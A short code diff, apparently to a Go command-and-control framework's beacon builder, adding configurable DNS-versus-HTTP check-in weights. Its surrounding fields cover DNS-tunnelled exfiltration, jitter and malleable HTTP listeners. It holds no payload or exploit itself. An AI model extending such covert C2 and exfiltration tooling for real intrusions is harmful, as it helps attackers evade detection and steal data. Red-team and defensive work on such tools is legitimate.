@@ -133,6 +133,11 @@ type ClientBuildRequest struct {
 	Encrypted           *bool    `json:"encrypted"` // Legacy global: nil or true = AES-GCM; false = plain base36
 	StagedRegistration  bool     `json:"staged_registration"`
 
+	// Dual check-in weighting: how often a dual beacon sends a check-in over DNS
+	// vs HTTP. Zero values keep the 2:1 (DNS-favoured) defaults.
+	CheckinDNSWeight  int `json:"checkin_dns_weight,omitempty"`
+	CheckinHTTPWeight int `json:"checkin_http_weight,omitempty"`
+
 	// Transport selects how the beacon reaches its C2 servers: "dns" (default and
 	// the behaviour of every pre-HTTP build), "http", or "dual". HTTPListeners
 	// carries the malleable listener configuration the beacon embeds; the same
@@ -1179,6 +1184,8 @@ var embeddedConfig = Config{
 	BeaconName:           %q,
 	BuildID:              %q,
 	StagedRegistration:   %t,
+	CheckinDNSWeight:     %d,
+	CheckinHTTPWeight:    %d,
 	HTTPExfil: HTTPExfilConfig{
 		MaxPayload:     %d,
 		MaxBodyBytes:   %d,
@@ -1239,6 +1246,7 @@ func getConfig() Config {
 		req.SleepMin, req.SleepMax, req.ExfilJitterMinMs, req.ExfilJitterMaxMs,
 		req.ExfilChunksPerBurst, req.ExfilBurstPauseMs, req.MaxSubdomainLength,
 		req.PayloadFormat, req.BeaconName, buildID, req.StagedRegistration,
+		req.CheckinDNSWeight, req.CheckinHTTPWeight,
 		req.HTTPMaxPayload, req.HTTPMaxBodyBytes, req.HTTPChunksPerBurst, req.HTTPBurstPauseMs,
 		regQT, regEnc, regMaxPayload, regPayloadFmt, regACKIP,
 		pollQT, pollEnc, pollMaxPayload, pollPayloadFmt, pollACKIP,
